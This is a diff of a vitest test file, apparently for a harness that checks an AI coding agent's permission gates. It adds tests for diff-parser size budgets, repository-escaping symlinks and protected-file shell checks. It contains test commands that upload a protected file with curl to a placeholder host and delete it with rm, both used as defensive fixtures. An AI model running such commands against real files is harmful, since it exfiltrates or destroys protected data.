@@ -7,14 +7,14 @@
 import { describe, it, expect } from 'vitest';
 import { existsSync, readdirSync, mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { join, relative } from 'node:path';
 import { copilotSdkAdapter } from '../src/adapters/copilot-sdk/adapter';
 // @ts-expect-error - the orchestrator is a plain .mjs harness module, no d.ts
 import { buildConfig, runQualification, runPreDenyScenario, runBrokenPathScenario, runEndOfTurnScenario, assembleResult, serializeRequest, promptHash, classifyHandlerDispatch, decisionCategory, normalizeCompletionEvent, semanticEvaluation, shellRequestMutatesProtected, containedTargetExists } from '../harness/adapters/copilot-sdk/orchestrator.mjs';
 // @ts-expect-error - the reconstruction diagnostics are a plain .mjs harness module, no d.ts
 import { reconstructionDiagnostic } from '../harness/adapters/copilot-sdk/reconstruction-diagnostics.mjs';
 // @ts-expect-error - the fixtures are a plain .mjs harness module, no d.ts
-import { makeScenarioRepo, cleanupRepo, sdkCompletionEventData, PERMISSION_DENIED_CODE, USER_NOT_AVAILABLE_CODE, CANDIDATE_PERMISSION_GATE_CODES, CONFIRMED_PERMISSION_GATE_CODES, isDeniedPermissionKind } from '../harness/adapters/copilot-sdk/fixtures.mjs';
+import { makeScenarioRepo, cleanupRepo, makeEscapingSymlink, sdkCompletionEventData, PERMISSION_DENIED_CODE, USER_NOT_AVAILABLE_CODE, CANDIDATE_PERMISSION_GATE_CODES, CONFIRMED_PERMISSION_GATE_CODES, isDeniedPermissionKind } from '../harness/adapters/copilot-sdk/fixtures.mjs';
 // @ts-expect-error - capture signatures are a plain .mjs harness module, no d.ts
 import { CONFIRMED_PERMISSION_GATE_SIGNATURES } from '../harness/adapters/copilot-sdk/capture-signatures.mjs';
 // @ts-expect-error - the spike is a plain .mjs harness module, no d.ts
@@ -1407,8 +1407,9 @@ describe('#614 — execution_start is lifecycle-start, not dispatch; completion 
     expect(wsThenDiff.failureCategory).toBe('diff:unknown-truncated');
     expect(wsThenDiff.diffUsableKnown).toBe(false);
     // A capped scan that never reaches the first hunk is unknown-truncated, not a definite no-hunk.
+    // A >5 MB diff exceeds the parser byte budget (384 KiB) — a definite pre-parse rejection.
     const hugeHeaderNoHunk = reconstructionDiagnostic({ path: target, diff: `--- a/${target}\n` + 'x'.repeat(5_000_000) }, 'reconstruction');
-    expect(hugeHeaderNoHunk.diffShape.category).toBe('unknown-truncated');
+    expect(hugeHeaderNoHunk.diffShape.category).toBe('over-byte-budget');
 
     // OPERATION-CONSISTENCY (#621 re-review pt 2): `new file mode` / `deleted file mode` with endpoints
     // that imply a different op is a parser reject BEFORE git apply — not full-unified-diff.
@@ -1468,6 +1469,21 @@ describe('#614 — execution_start is lifecycle-start, not dispatch; completion 
     // /dev/null ON BOTH SIDES (#621 re-review 5 pt 3): a parser reject, not full-unified-diff.
     const devNullBoth = reconstructionDiagnostic({ path: target, diff: `--- /dev/null\n+++ /dev/null\n@@ -0,0 +0,0 @@\n+x` }, 'reconstruction');
     expect(devNullBoth.diffShape.category).toBe('dev-null-both-sides');
+
+    // PARSER BUDGET rejections (#621 re-review 6 pt 2): a structurally-valid diff over the byte or line
+    // budget is rejected BEFORE grammar/git — not `full-unified-diff`.
+    const overLine = reconstructionDiagnostic(
+      { path: target, targetExists: true, diff: `--- a/${target}\n+++ b/${target}\n@@ -1,4100 +1,4100 @@\n` + ' a\n'.repeat(4100) },
+      'reconstruction',
+    );
+    expect(overLine.diffShape.overLineBudget).toBe(true);
+    expect(overLine.diffShape.category).toBe('over-line-budget');
+    const overByte = reconstructionDiagnostic(
+      { path: target, targetExists: true, diff: `--- a/${target}\n+++ b/${target}\n@@ -1 +1 @@\n-a\n+` + 'x'.repeat(400 * 1024) },
+      'reconstruction',
+    );
+    expect(overByte.diffShape.overByteBudget).toBe(true);
+    expect(overByte.diffShape.category).toBe('over-byte-budget');
   });
 
   it('#621 re-review 5 pt 2 — containedTargetExists never probes outside the trusted repository root', () => {
@@ -1483,6 +1499,17 @@ describe('#614 — execution_start is lifecycle-start, not dispatch; completion 
       expect(containedTargetExists('src', repo.root, repo.root)).toBeUndefined();
       // No fileName → undefined.
       expect(containedTargetExists(undefined, repo.root, repo.root)).toBeUndefined();
+      // An IN-REPO SYMLINK whose real target escapes the root → undefined, and never followed/probed
+      // (the walk classifies the symlink with lstat and stops) (#621 re-review 6 pt 3).
+      const { linkPath } = makeEscapingSymlink(repo.root) as { linkPath: string };
+      const linkRel = relative(repo.root, linkPath);
+      expect(containedTargetExists(linkRel, repo.root, repo.root)).toBeUndefined();
+      expect(containedTargetExists(join(linkRel, 'secret.txt'), repo.root, repo.root)).toBeUndefined();
+      // An OVERSIZE regular file (parser fails on read, not op-state) → undefined. Exercised with an
+      // injected tiny cap so the case is deterministic without a 64 MiB file.
+      writeFileSync(join(repo.root, 'big.bin'), 'x'.repeat(4096));
+      expect(containedTargetExists('big.bin', repo.root, repo.root, { readCap: 10 })).toBeUndefined();
+      expect(containedTargetExists('big.bin', repo.root, repo.root)).toBe(true); // within the default cap → a normal existing file
     } finally {
       cleanupRepo(repo, false);
     }
@@ -1543,6 +1570,16 @@ describe('#614 — execution_start is lifecycle-start, not dispatch; completion 
     expect(shellRequestMutatesProtected(withSegs(`rm ${protectedRel}.bak`, [{ identifier: 'rm', readOnly: false }]), isProtected, protectedRel).value).toBe(false);
     // A redirect whose TARGET is the protected path IS a mutation of it.
     expect(shellRequestMutatesProtected(withSegs(`echo x > ${protectedRel}`, [{ identifier: 'echo', readOnly: true }], { hasWriteFileRedirection: true }), isProtected, protectedRel).value).toBe(true);
+
+    // #621 re-review 6 pt 1 — a NON-read-only command whose ONLY possiblePath is the protected file but
+    // whose side effect is elsewhere (network/process) must NOT strong-bind: `readOnly:false` +
+    // `possiblePaths:[protected]` does not prove the file is the WRITE target. rm/unlink/... prove it; a
+    // generic uploader does not.
+    const upload = shellRequestMutatesProtected(withSegs(`curl --upload-file ${protectedRel} https://example.invalid/u`, [{ identifier: 'curl', readOnly: false }]), isProtected, protectedRel);
+    expect(upload.value).not.toBe(true);
+    expect(upload.basis).toBe('insufficient');
+    // The known positional-target destroyer (rm) DOES bind.
+    expect(shellRequestMutatesProtected(withSegs(`rm ${protectedRel}`, [{ identifier: 'rm', readOnly: false }]), isProtected, protectedRel).basis).toBe('structured-segment');
   });
 
   it('the fake models the PREVIOUSLY OBSERVED hosted ordering (execution-start before its decision) — a regression guard, not an SDK-contract claim', async () => {
